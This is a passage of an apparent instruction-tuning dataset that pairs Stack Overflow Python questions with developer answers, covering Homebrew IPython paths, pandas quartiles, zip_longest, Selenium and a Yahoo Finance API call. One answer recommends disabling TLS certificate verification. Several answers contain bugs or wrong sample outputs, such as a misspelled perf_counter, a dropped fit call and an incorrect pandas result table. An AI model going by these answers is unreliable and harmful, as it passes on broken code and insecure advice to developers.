self.search_param_list}\n<\/code><\/pre>\n<p>Demo:<\/p>\n<pre><code>&gt;&gt;&gt; A().search_params2()\n{'from_': 2, 'to': 3}\n<\/code><\/pre>\n<hr \/>\n<p>Of course, you can get all instance variables immediately with <code>vars<\/code>.<\/p>\n<pre><code>&gt;&gt;&gt; vars(A())\n{'x': 1, 'from_': 2, 'to': 3, 'search_param_list': ['from_', 'to']}\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n PYTHONPATH is not read by IPython when installed via Homebrew<p>I installed IPython and Python 3 by using Homebrew on a clean macOS Catalina (virtual machine).<\/p>\n\n<pre><code>$ brew install ipython\n<\/code><\/pre>\n\n<p>As the <code>ipython<\/code> package is dependent on the <code>python3<\/code> package, Homebrew installs <code>ipython<\/code> and <code>python3<\/code> together.<\/p>\n\n<pre><code>$ brew info ipython \nipython: stable 7.13.0 (bottled), HEAD\nInteractive computing in Python\nhttps:\/\/ipython.org\/\n\/usr\/local\/Cellar\/ipython\/7.13.0 (2,905 files, 21.8MB) *\n  Poured from bottle on 2020-04-15 at 18:48:22\nFrom: https:\/\/github.com\/Homebrew\/homebrew-core\/blob\/master\/Formula\/ipython.rb\n==&gt; Dependencies\nRequired: python \u2714, zeromq \u2714\n==&gt; Options\n--HEAD\n    Install HEAD version\n==&gt; Analytics\ninstall: 11,543 (30 days), 33,591 (90 days), 98,995 (365 days)\ninstall-on-request: 5,404 (30 days), 15,768 (90 days), 49,364 (365 days)\nbuild-error: 0 (30 days)\n<\/code><\/pre>\n\n<p>I expected that both of these two commands read <code>PYTHONPATH<\/code> from my shell environment, because <code>ipython<\/code> works so when it is installed by <code>pip3 install ipython<\/code>.<\/p>\n\n<p>However <code>ipython<\/code> and <code>python3<\/code> installed by using Homebrew have different <code>sys.path<\/code> settings.<\/p>\n\n<pre><code>$ which ipython\n\/usr\/local\/bin\/ipython\n$ which python3\n\/usr\/local\/bin\/python3\n$ ipython \nPython 3.7.7 (default, Mar 10 2020, 15:43:33) \nType 'copyright', 'credits' or 'license' for more information\nIPython 7.13.0 -- An enhanced Interactive Python. Type '?' for help.\n\nIn [1]: import sys; sys.path                                                                                            \nOut[1]: \n['\/usr\/local\/Cellar\/ipython\/7.13.0\/libexec\/bin',\n '',\n '\/usr\/local\/Cellar\/ipython\/7.13.0\/libexec\/lib\/python3.7\/site-packages',\n '\/usr\/local\/Cellar\/ipython\/7.13.0\/libexec\/vendor\/lib\/python3.7\/site-packages',\n '\/usr\/local\/Cellar\/python\/3.7.7\/Frameworks\/Python.framework\/Versions\/3.7\/lib\/python37.zip',\n '\/usr\/local\/Cellar\/python\/3.7.7\/Frameworks\/Python.framework\/Versions\/3.7\/lib\/python3.7',\n '\/usr\/local\/Cellar\/python\/3.7.7\/Frameworks\/Python.framework\/Versions\/3.7\/lib\/python3.7\/lib-dynload',\n '\/usr\/local\/lib\/python3.7\/site-packages',\n '\/usr\/local\/Cellar\/ipython\/7.13.0\/libexec\/lib\/python3.7\/site-packages\/IPython\/extensions',\n '\/Users\/oxon\/.ipython']\n\n$ python3\nPython 3.7.7 (default, Mar 10 2020, 15:43:33) \n[Clang 11.0.0 (clang-1100.0.33.17)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; import sys; sys.path\n['', '\/Users\/oxon\/root-6.20.02\/obj\/lib', '\/usr\/local\/Cellar\/python\/3.7.7\/Frameworks\/Python.framework\/Versions\/3.7\/lib\/python37.zip', '\/usr\/local\/Cellar\/python\/3.7.7\/Frameworks\/Python.framework\/Versions\/3.7\/lib\/python3.7', '\/usr\/local\/Cellar\/python\/3.7.7\/Frameworks\/Python.framework\/Versions\/3.7\/lib\/python3.7\/lib-dynload', '\/usr\/local\/lib\/python3.7\/site-packages']\n<\/code><\/pre>\n\n<p>Q1. Why are they different?<\/p>\n\n<p>Q2. Is this an expected behavior?<\/p>\n\n<p>Q3. Why IPython reads <code>PYTHONPATH<\/code> when it is installed by <code>pip3 install ipython<\/code>?<\/p>","output_text":"<p>It comes down to <a href=\"https:\/\/github.com\/Homebrew\/homebrew-core\/blob\/0b738b77a5a13a66a52d76d34c4f608b719e0485\/Formula\/ipython.rb#L136\" rel=\"nofollow noreferrer\">the following line<\/a> in the Homebrew recipe for <code>ipython<\/code>:<\/p>\n\n<pre class=\"lang-ruby prettyprint-override\"><code>bin.env_script_all_files(libexec\/\"bin\", :PYTHONPATH =&gt; ENV[\"PYTHONPATH\"])\n<\/code><\/pre>\n\n<p>It creates the <code>\/usr\/local\/bin\/ipython<\/code> script that sets <code>PYTHONPATH<\/code> to a fixed value that is needed for IPython to work properly (since its modules are outside the default Python module directory) before calling the <code>ipython<\/code> executable:<\/p>\n\n<pre><code>#!\/bin\/bash\nPYTHONPATH=\"\/usr\/local\/Cellar\/ipython\/7.14.0\/libexec\/lib\/python3.8\/site-packages:\/usr\/local\/Cellar\/ipython\/7.14.0\/libexec\/vendor\/lib\/python3.8\/site-packages\" exec \"\/usr\/local\/Cellar\/ipython\/7.14.0\/libexec\/bin\/ipython\" \"$@\"\n<\/code><\/pre>\n\n<p>It simply overrides your set value of <code>PYTHONPATH<\/code>. You may modify the script to read:<\/p>\n\n<pre><code>PYTHONPATH=\"$PYTHONPATH:\/usr\/local\/Cellar\/...\n<\/code><\/pre>\n\n<p>This will make it append to your <code>PYTHONPATH<\/code> instead of completely overriding it, but the file will be overwritten when the Homebrew package is updated or reinstalled. Therefore, it is advisable to instead put in the IPython startup directory <code>~\/.ipython\/profile_default\/startup<\/code> a script, say <code>root.py<\/code> that looks like:<\/p>\n\n<pre><code>import sys\nsys.path.append('\/Users\/oxon\/root-6.20.02\/obj\/lib')\n<\/code><\/pre>\n\n<p>When you install <code>ipython<\/code> using <code>pip<\/code>, its modules go into the default Python module directory, be it the system one or the user one or the one in the virtual environment, and it is not necessary to mess with <code>PYTHONPATH<\/code> for <code>ipython<\/code> to function correctly.<\/p>\n\n<p>I'd say the answer to <strong>Q2<\/strong> is therefore that it's probably a bug and you may submit an issue with Homebrew on GitHub, although I wouldn't hold my breath given how they treated <a href=\"https:\/\/github.com\/Homebrew\/homebrew-core\/issues\/31325\" rel=\"nofollow noreferrer\">the same issue with Jupyter<\/a>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n convert number to scientific notation python with a variable<p>I want to use <code>str.format<\/code> to convert 2 number to scientific notation raised to the same exponential but the exponential need to be set off the <code>str.format<\/code>.\nExample:<\/p>\n<pre><code>from math import log10\ny=10000\nx=round(np.log10(y))\nm=10\ny=&quot;{:e}&quot;.format(y)\nm=&quot;{:e}&quot;.format(m)\nprint(y)\nprint(m)\n<\/code><\/pre>\n<p>here I have that m has e = 1 and y e = 4 and what I want is for both to have the same &quot;e&quot;. i want to set both to exponencial x.<\/p>","output_text":"<p>I think you have to calculate this yourself, for example using a helper function which returns a string:<\/p>\n<pre><code>def format_exp(x, n):\n    significand = x \/ 10 ** n\n    exp_sign = '+' if n &gt;= 0 else '-'\n    return f'{significand:f}e{exp_sign}{n:02d}'\n<\/code><\/pre>\n<p>Explanation:<\/p>\n<ul>\n<li><code>x<\/code> is the number to format, and <code>n<\/code> is the power that you want to display;<\/li>\n<li><code>significand<\/code> calculates the part to show in front of the <code>e<\/code> by dividing <code>x<\/code> by 10<sup>n<\/sup> (<code>10 ** n<\/code>);<\/li>\n<li><code>exp_sign<\/code> is either <code>+<\/code> or <code>-<\/code>, depending on the value of <code>n<\/code> (to replicate the default behaviour).<\/li>\n<\/ul>\n<p>Example usage:<\/p>\n<pre><code>&gt;&gt;&gt; import math\n&gt;&gt;&gt; y = 10000\n&gt;&gt;&gt; m = 10\n&gt;&gt;&gt; x = math.floor(math.log10(y))  # x = 4\n&gt;&gt;&gt; print(format_exp(y, x))\n1.000000e+04\n&gt;&gt;&gt; print(format_exp(m, x))\n0.001000e+04\n&gt;&gt;&gt; print(format_exp(y, 1))\n1000.000000e+01\n&gt;&gt;&gt; print(format_exp(m, 1))\n1.000000e+01\n<\/code><\/pre>\n<p>You can increase the complexity of this function by adding an additional parameter <code>d<\/code> to set the number of decimals printed in the significand part (with a default value of <code>6<\/code> to reproduce the default Python behaviour):<\/p>\n<pre><code>def format_exp(x, n, d=6):\n    significand = x \/ 10 ** n\n    exp_sign = '+' if n &gt;= 0 else '-'\n    return f'{significand:.{d}f}e{exp_sign}{n:02d}'\n<\/code><\/pre>\n<p>With this function, you can control the number of decimals printed:<\/p>\n<pre><code>&gt;&gt;&gt; print(format_exp(y, x))  # default behaviour still works\n1.000000e+04\n&gt;&gt;&gt; print(format_exp(y, x, 4))\n1.0000e+04\n&gt;&gt;&gt; print(format_exp(y, x, 1))\n1.0e+04\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n fig.text in italic delete space in string how to avoid?<p>Why does the below code delete space when printed on figure <code>fig<\/code> ?<\/p>\n<pre><code>fig = plt.figure(figsize=(15,5))\nTestStr= &quot;$* This is a Test$&quot;\nprint(TestStr) # Returns : * This is a Test \ntext = fig.text(0.30, 0.005, BoFaSpread,horizontalalignment='center', wrap=True)# Displays on fig : *ThisisaTest \n<\/code><\/pre>","output_text":"<p>All <a href=\"https:\/\/matplotlib.org\/stable\/api\/text_api.html#matplotlib.text.Text\" rel=\"nofollow noreferrer\"><code>matplotlib.text.Text<\/code><\/a> instances have <a href=\"https:\/\/matplotlib.org\/stable\/tutorials\/text\/text_props.html\" rel=\"nofollow noreferrer\">properties<\/a> that can be included when adding text to a figure. The one that can be used here is <a href=\"https:\/\/matplotlib.org\/stable\/api\/text_api.html#matplotlib.text.Text.set_fontstyle\" rel=\"nofollow noreferrer\"><code>fontstyle<\/code><\/a> (<code>style<\/code> also works)<\/p>\n<pre><code>fig = plt.figure(figsize=(5, 3))\ntestStr = &quot;$* This is a Test$&quot;\nfig.text(0.5, 0.6, testStr, horizontalalignment='center')\n\ntestStr2 = &quot;* This is a Test&quot;  # don't need to include $ in the text\nfig.text(0.5, 0.5, testStr2, horizontalalignment='center', fontstyle=&quot;italic&quot;) \n# can also use style=&quot;italic&quot;\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/DKI5p.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/DKI5p.png\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n For loop keeps getting jupyter stuck<p>I am new to data analysis and python, in class, we were making a for loop to check different no trees in the random forest and find out the one with the best accuracy, our teacher gave us the assignment to achieve this by a for loop, but the code I wrote makes the notebook stuck and doesn't give an output, can someone please tell me what is wrong with my code? Like, I finally got the answer but after a very long time, can anyone tell me how to do the same thing more efficiently without making any changes to the range?<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>accuracy_scores = []\nfor i in range(50,500,10):\n    model_random = RandomForestClassifier(n_estimators=i,criterion=&quot;entropy&quot;,max_features=10,min_samples_leaf=50)\n    model_random.fit(X_train,Y_train)\n    Y_pred=model_random.predict(X_test)\n    accuracy=round(accuracy_score(Y_pred, Y_test)*100,2)\n    accuracy_scores.append(accuracy)\nprint(max(accuracy_scores))\ny=accuracy_scores.index(max(accuracy_scores))*10+50\nprint(y)\n\n<\/code><\/pre>","output_text":"<p>The for loop is correct. I'm assuming your RandomForestClassifier function is taking some time to calculate.<\/p>\n<p>My suggestion is to add some print\/logger statement to see where and what takes the most amount of time.<\/p>\n<pre><code>from time import per_counter\n\nfor i in range(50, 500, 10):\n    start = perf_counter()\n    model_random = RandomForestClassifier(n_estimators=i,criterion=&quot;entropy&quot;,max_features=10,min_samples_leaf=50)\n    calc_time = perf_counter() - start\n    print(f&quot;RandomForestClassifier took {calc_time:.2f}&quot;)\n    Y_pred=model_random.predict(X_test)\n    accuracy=round(accuracy_score(Y_pred, Y_test)*100,2)\n    accuracy_scores.append(accuracy)\n\nprint(max(accuracy_scores))\ny=accuracy_scores.index(max(accuracy_scores))*10+50\nprint(y)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Menu items not visible in developer mode odoo V13<p>There are few modules only visible in developer mode.\nI need to visible it in non-develope mode. How can i do it?<\/p>\n<p><strong>My findings:<\/strong><\/p>\n<p>I have few xml views in common folder which has xml alone with out  <strong>&lt;<strong>menuitems<\/strong>&gt;<\/strong>  and in later point in another folder I have listed all the menuitems from common folder as well as current folder menu items to the order i want.<\/p>\n<p><strong>why i need to place the menuitems in other folder ?<\/strong><\/p>\n<p>If i place the menu items in the common folder, odoo is giving them first as per menu sequences by default.But i need it later. so i combined all the menu items to the order i want in current folder.<\/p>\n<p>It works in Developer mode without any issues. But in non developer mode it isn't.\nI have also verified if any groups is making this but no.<\/p>\n<p>I hope i made some sense.<\/p>","output_text":"<p>If you want to make visible the invisible menu items in Odoo so for that you've to remove the <strong><code>groups<\/code><\/strong> from the menu items like.<\/p>\n<pre><code>&lt;menuitem id=&quot;warranty_management_root&quot; parent=&quot;stock.menu_stock_config_settings&quot;\n                  groups=&quot;warranty_management.group_stock_warranty&quot; name=&quot;Warranty&quot;\/&gt;\n<\/code><\/pre>\n<p>After removing<\/p>\n<pre><code>&lt;menuitem id=&quot;warranty_management_root&quot; parent=&quot;stock.menu_stock_config_settings&quot;\n                   name=&quot;Warranty&quot;\/&gt;\n<\/code><\/pre>\n<p>Secondly if there is no group in menu items there is another way to assign groups to menu item like this.<\/p>\n<pre><code>&lt;record id=&quot;hr.menu_hr_root&quot; model=&quot;ir.ui.menu&quot; &gt;\n     &lt;field name=&quot;groups_id&quot; eval=&quot;[(6, 0, [ref('module_name.group_hr_menu')])]&quot;\/&gt;\n&lt;\/record&gt;\n<\/code><\/pre>\n<p>Just remove this code or comment it will work for you.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python List Comprehension With Equation<p>I need to turn this into a list comprehension.  I have been stuck for a while. Any Ideas?<\/p>\n<pre><code>result = []\nfor i in range(length + 1):\n    m = number * i\n    result.append(m)\ndel result[0]\nreturn result\n<\/code><\/pre>","output_text":"<p>You can do this -<\/p>\n<pre><code>[number*i for i in range(length+1)][1:]\n<\/code><\/pre>\n<p>This iterates over the <code>range(length+1)<\/code> multiplying each to the number and storing in a list. Then I just take all the elements except the 0th.<\/p>\n<p>You can start iterating from 1 to avoid generate 0th element in the first place, as suggested by @wwii<\/p>\n<pre><code>[number*i for i in range(1,length+1)] #or simply range(length)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to split in such a way that \"\\n\" is also a new element in python?<p>I have a big string where there are multiple lines.\nFor example,<\/p>\n<pre><code>abc def\nghi hij\n\n<\/code><\/pre>\n<p>When I do .split() with the above string, I get as follows:<\/p>\n<pre><code>['abc', 'def\\n', 'ghi', 'hih']\n<\/code><\/pre>\n<p>The output I want is,<\/p>\n<pre><code>['abc', 'def', '\\n', 'ghi', 'hih']\n<\/code><\/pre>\n<p>There can be cases where .split() leads to:-<\/p>\n<pre><code>['abc', '\\n', 'dsa\\n\\n\\nkij', 'poi']\n<\/code><\/pre>\n<p>I want this actually as follow:<\/p>\n<pre><code>['abc', '\\n', 'dsa', '\\n', '\\n', '\\n', 'kij', 'poi']\n<\/code><\/pre>\n<p>I would like to have a simple python code.<\/p>","output_text":"<p>You can write a much simpler regex for this using groups and <code>.findall()<\/code>, which will return a list of all matches from a source string for you<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>&gt;&gt;&gt; src = &quot;&quot;&quot;abc def\n... ghi hij\n... &quot;&quot;&quot;\n&gt;&gt;&gt; re.findall(r&quot;([^ \\n]+|\\n)&quot;, src)\n['abc', 'def', '\\n', 'ghi', 'hij', '\\n']\n<\/code><\/pre>\n<pre class=\"lang-py prettyprint-override\"><code>&gt;&gt;&gt; src = &quot;&quot;.join(['abc', '\\n', 'dsa\\n\\n\\nkij', 'poi'])\n&gt;&gt;&gt; print(src)\nabc\ndsa\n\n\nkijpoi\n&gt;&gt;&gt; re.findall(r&quot;([^ \\n]+|\\n)&quot;, src)\n['abc', '\\n', 'dsa', '\\n', '\\n', '\\n', 'kijpoi']\n<\/code><\/pre>\n<p>This works by finding every block of either<\/p>\n<ul>\n<li>greedy ranges of <em>not<\/em> space or <code>\\n<\/code> (anything until one is found; this is an opportunity to include more characters like <code>\\t<\/code> or to use <code>\\s<\/code>, which is any &quot;whitespace character&quot;)<\/li>\n<li>exactly <code>\\n<\/code><\/li>\n<\/ul>\n<p>You could potentially also use <code>.finditer()<\/code> to make more efficient use in some generator, though it's likely to make your solution more complex<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Identify an array with the maximum value, element wise in numpy<p>I'm looking for a variation on the answer for <a href=\"https:\/\/stackoverflow.com\/questions\/21816433\/element-wise-array-maximum-function-in-numpy-more-than-two-arrays\">this question<\/a><\/p>\n\n<p>Given multiple arrays (3 or more), i need to construct a new array where each element identifies the input array which had the maximum value.<\/p>\n\n<p>eg<\/p>\n\n<pre><code>array0 = np.array([1, 2, 3])\narray1 = np.array([0, 3, 4])\narray2 = np.array([-1, 1, 1])\n<\/code><\/pre>\n\n<p>the resulting array should be <code>array([0,1,1])<\/code><\/p>\n\n<p>np.maximum.reduce does not seem to work in the case.\nI could only come up with a brute force for loop<\/p>\n\n<pre><code>d = []\nfor i in range(len(array0)):\n  k = 0\n  if array1[i] &gt; array0[i]:\n    k = 1\n  if array2[i] &gt; array1[i] and array2[i] &gt; array0[i]:\n    k = 2\n  d.append(k)\n<\/code><\/pre>\n\n<p>Is there a more pythonic\/numpy way to do this?<\/p>","output_text":"<p>Build a new array from the three and take the <a href=\"https:\/\/docs.scipy.org\/doc\/numpy\/reference\/generated\/numpy.argmax.html\" rel=\"nofollow noreferrer\"><code>argmax<\/code><\/a> along the first axis:<\/p>\n\n<pre><code>np.array([array0, array1, array2]).argmax(0)\n# array([0, 1, 1])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Quartiles and other parameters in groupby on multiple keys in pandas python<p><strong>df columns are as below:<\/strong><\/p>\n\n<pre><code>  Key1   Key2   Val1  \n<\/code><\/pre>\n\n<p><strong>Output needed<\/strong>\nI want groupby output where Val1 column has values clubbed together with <strong>groupby in python on keys Key1 and Key2<\/strong>.<\/p>\n\n<p><strong>Output expected: df2  [groupby on key1 and key2]<\/strong><\/p>\n\n<pre><code>Key1 Key2 Val1  Count Sum Q1  Q2  Q3\n<\/code><\/pre>","output_text":"<p>Create a <strong>function to calculate Q1, Q2 and Q3: 25th, 50th and 75th percentiles<\/strong> as below:<\/p>\n\n<pre><code>def percentile(n):\n    def percentile_(x):\n        return np.percentile(x, n)\n    percentile_.__name__ = 'percentile_%s' % n\n    return percentile_\n<\/code><\/pre>\n\n<p>Now you can use <strong>named aggregation<\/strong> as mentioned below to obtain count, sum and the 3 quartile columns as you want.<\/p>\n\n<pre><code>      df2 = (df.groupby([\"Key1\", \"Key2\"])\n             .agg(Count=(\" Val1\", 'count'),    \n                  Sum=('Val1','sum'),        \n                  Q1= (' Val1',percentile(25), #This is for first quartile\n                  Q2= (' Val1',percentile(50), #2nd Quartile\n                  Q3= (' Val1',percentile(75)) #This is for Quartile 3\n<\/code><\/pre>\n\n<p>Random eg.<\/p>\n\n<p><strong>df<\/strong> say was<\/p>\n\n<pre><code>Key1   Key2  Val1\na       a     1\na       a     2\na       a     3\na       a     4\nb       b     5\nb       b     6\nb       b     7\nb       b     8\n<\/code><\/pre>\n\n<p><strong>df2<\/strong> will have below columns as asked for groupby on keys Key1 and Key2.<\/p>\n\n<pre><code>Key1 Key2  Count  Sum   Q1  Q2  Q3\n a    a     4     10    1   2.5 3\n b    b     4     6.5   5   6.5 7\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to export all values of lists to csv on Python<pre><code>list_1 = ['1','2','3','4','5','6','7','8']\nlist_2 = ['n1','n2','n3','n4','n5','n6','n7','n8','n9','n10']\nlist_3 = ['o1','o2','o3','o4','o5','o6','o7','o8','o9','o10']\n\ncols = zip(list_1,list_2,list_3)\n\nwith open('file.csv', 'w', newline='') as f:\n    thewriter = csv.writer(f)\n\n    thewriter.writerow(['list_1','list_2','list_3'])\n    for col in cols:\n       thewriter.writerow(col)\n<\/code><\/pre>\n<h1>Output<\/h1>\n<pre><code>list1   list2   list3\n  1      n1      o1\n  2      n2      o2\n  3      n3      o3\n  4      n4      o4\n  5      n5      o5\n  6      n6      o6\n  7      n7      o7\n  8      n8      o8\n<\/code><\/pre>\n<h1>Expected Output<\/h1>\n<pre><code>list1   list2   list3\n  1      n1      o1\n  2      n2      o2\n  3      n3      o3\n  4      n4      o4\n  5      n5      o5\n  6      n6      o6\n  7      n7      o7\n  8      n8      o8\n         n9      o9\n         n10     o10 \n<\/code><\/pre>\n<p>I have 3 lists, <code>list_1<\/code> has 8 items, <code>list_2<\/code> has 10 items and <code>list_3<\/code> also have 10 items,<\/p>\n<p>but when I write the lists to csv, <code>list_2<\/code> and <code>list_3<\/code> columns do not show the last 2 items.<\/p>","output_text":"<p>It's the default behavior of <code>zip<\/code>: truncate to the length of the shortest iterable. You can use <a href=\"https:\/\/docs.python.org\/3\/library\/itertools.html#itertools.zip_longest\" rel=\"nofollow noreferrer\"><code>zip_longest<\/code><\/a> instead:<\/p>\n\n<ul>\n<li>Import it first:<\/li>\n<\/ul>\n\n<pre><code>from itertools import zip_longest\n<\/code><\/pre>\n\n<ul>\n<li>Then replace the line where you assign <code>cols<\/code> with:<\/li>\n<\/ul>\n\n<pre><code>cols = zip_longest(list_1,list_2,list_3, fillvalue=\"\")\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python Code when submitted returns Runtime Error - NZEC<pre><code>def fact(y):\n    if y == 1 or y == 0:\n        return 1\n    else:\n        return y*fact(y-1)\n\nx,n= map(int,input().split())\n\nf = fact(n)%10\nl = x**f\n\nprint(l%10)\n<\/code><\/pre>\n\n<p>It was getting submitted partially.<\/p>","output_text":"<p><strong>most likely<\/strong> value of y is greater than 10^4. python's recursion stack space is 10^4. if this space runs out compiler throws nzec\nthis can be prevented by adding this.set the limit according to the max length of y.<\/p>\n<pre><code>from sys import setrecursionlimit\nsetrecursionlimit(10**9)\n<\/code><\/pre>\n<p>Add constraints from next time.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Button not clickable with selenium python<p>I've been trying to click a button using selenium but it keeps saying that the element isn't interactable even though it is visible on screen and I can manually click it. I've tried webdriverwait, implicitly wait and many other solutions but none seem to work. Please can anyone offer a solution.\nI've attached the buttons code and my own code.<\/p>\n<pre><code>import time\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options \nbrowser = webdriver.Chrome('')\nchrome_options = webdriver.ChromeOptions()\nchrome_options.add_argument(&quot;--disable-popup-blocking&quot;)\nbrowser.implicitly_wait(10)\nbrowser.get('https:\/\/www.aldi.co.uk\/kirkton-house-high-back-desk-chair\/p\/709360437078000')\nbrowser.maximize_window()\nbuybutton = False\n\nwhile not buybutton:\n    try:\n        addToCartBtn = addButton = browser.find_element_by_class_name('disabled')\n        print(&quot;Button isn't ready yet.&quot;)\n        time.sleep(1)\n        browser.refresh()\n    except:\n        time.sleep(2)\n        addToCartBtn = addButton = browser.find_element_by_xpath('\/\/*[@id=&quot;addToBasketButton&quot;]')\n        addToCartBtn.click()\n        \n     \n        buybutton = True\n<\/code><\/pre>\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\n<div class=\"snippet-code\">\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;div class=\"product-details__selectButton\" data-component=\"productAdder\"&gt;\n                &lt;span class=\"js-sticky-atc__anchor\"&gt;&lt;\/span&gt;\n                &lt;button class=\"product-details__cta js-product-cta button button--big button--rectangle button--transactional\" type=\"submit\" data-sku=\"709360437078000\" data-limit=\"\" data-limit-error=\"Sorry, you can only purchase 10 of this item.\" data-stock=\"inStock\" data-stock-error=\"Out of stock\" data-stock-pack-cta1=\"true\" data-stock-pack-cta2=\"true\" data-csrftoken=\"207d2b40-a785-40b6-89cd-987eba44a31c\" data-is-buy-online=\"true\" data-api=\"\/api\/cart\/add\" data-purchase-disabled=\"\" aria-label=\"Add Kirkton House High Back Desk Chair to the basket\" aria-controls=\"minicart-trigger\" id=\"addToBasketButton\"&gt;\n                    &lt;span class=\"js-product-cta-label\" data-product-added=\"PRODUCT ADDED\"&gt;\n                        ADD TO BASKET&lt;\/span&gt;\n                    &lt;svg class=\"icon icon--basket\"&gt;\n                        &lt;use xlink:href=\"\/assets\/8b290d70406f652780c7cc1c72fe4a88\/dist\/icons\/sprite.symbol.svg#basket\"&gt;&lt;\/use&gt;\n                    &lt;\/svg&gt;\n                &lt;\/button&gt;\n            &lt;\/div&gt;<\/code><\/pre>\n<\/div>\n<\/div>\n<\/p>","output_text":"<p>Try this xpath:<\/p>\n<pre><code>driver.find_element_by_xpath(&quot;.\/\/ul[contains(@class,'errors')]\/\/following::form[contains(@class,'product-form')]\/\/button[@id='addToBasketButton']&quot;).click()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Error: Errno socket error] [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)<p>I have a little code, in python 2.7.17, where I'm trying to reach the Yahoo! Finance API to get information about a stock, but when I execute it, I get an error. I don't know how to fix it. <\/p>\n\n<p>This is the code:   <\/p>\n\n<pre><code> import urllib\n\nurlStock = 'http:\/\/finance.yahoo.com\/d\/quotes.csv?s=aapl&amp;f=nagh' \nresponse = urllib.urlopen(urlStock).read()\nprint response\n<\/code><\/pre>\n\n<p>And this is the error:<\/p>\n\n<pre><code>   Exception has occurred: IOError\n[Errno socket error] [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)\n  File \"\/Users\/ivanparra\/Dropbox\/Aprendizaje Python\/InternetTests.py\", line 4, in &lt;module&gt;\n    response = urllib.urlopen(urlStock).read()\n<\/code><\/pre>","output_text":"<p>That site has been discontinued for since 2018, unfortunately (<a href=\"https:\/\/github.com\/RxJSInAction\/rxjs-in-action\/issues\/13\" rel=\"nofollow noreferrer\">more discussion here<\/a>). However, there is an alternative, as pointed out on the linked Github issue thread. The URL is:<\/p>\n\n<pre><code>https:\/\/query1.finance.yahoo.com\/v7\/finance\/quote?lang=en-US&amp;region=US&amp;corsDomain=finance.yahoo.com&amp;symbols=AAPL&amp;fields=regularMarketPrice\n<\/code><\/pre>\n\n<p>Personally, I tend to prefer using the <code>requests<\/code> library (which you can easily install with pip) whenever possible because of its simple syntax. If you have SSL issues, see my comment in the example code.<\/p>\n\n<p>Here's how I'd query it:<\/p>\n\n<pre><code>import requests\nimport pdb\n\nres = requests.get(\"https:\/\/query1.finance.yahoo.com\/v7\/finance\/quote?lang=en-US&amp;region=US&amp;corsDomain=finance.yahoo.com&amp;symbols=AAPL&amp;fields=regularMarketPrice\")\n# If you need to work around SSL issues, set the verify kw arg to False. For example:\n# requests.get(\"URL_HERE\", verify=False)\n\nstock_data = res.json()\nprice = stock_data['quoteResponse']['result'][0]['regularMarketPrice']\nprint(price)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to fix ValueError: time data '18\/02\/2020 20:14:31' does not match format '%d\/%m\/%y %H:%M:%S' in Python?<p>I am developing a web application with Flask Python.\nI have a Mysql table with a text column date:<\/p>\n<pre><code>-- date --\n10\/06\/2020 18:50:17\n10\/06\/2020 18:55:10\n28\/05\/2020 22:18:06\n29\/03\/2020 20:47:01\n29\/03\/2020 21:29:14\n<\/code><\/pre>\n<p>These data above are date in string format.\nI need to convert these string dates into format dates.<\/p>\n<p>I did this in python :<\/p>\n<pre><code>actions = Action.query.all() # This is SQLAlchemy request to get all the rows of table 'Action'\nfor action in actions:\n    date=action.date\n    # convert this date string in date format\n    date_time_obj = datetime.strptime(date, '%d\/%m\/%y %H:%M:%S')\n    print(date_time_obj)\n<\/code><\/pre>\n<p>But I get this error output:<\/p>\n<pre><code>Traceback (most recent call last):\n  File &quot;j:\/Dropbox\/cff\/Python\/folder\/test.py&quot;, line 18, in &lt;module&gt;\n    date_time_obj = datetime.strptime(date, '%d\/%m\/%y %H:%M:%S')\n  File &quot;C:\\Users\\Nino\\AppData\\Local\\Programs\\Python\\Python37\\lib\\_strptime.py&quot;, line 577, in _strptime_datetime\n    tt, fraction, gmtoff_fraction = _strptime(data_string, format)\n  File 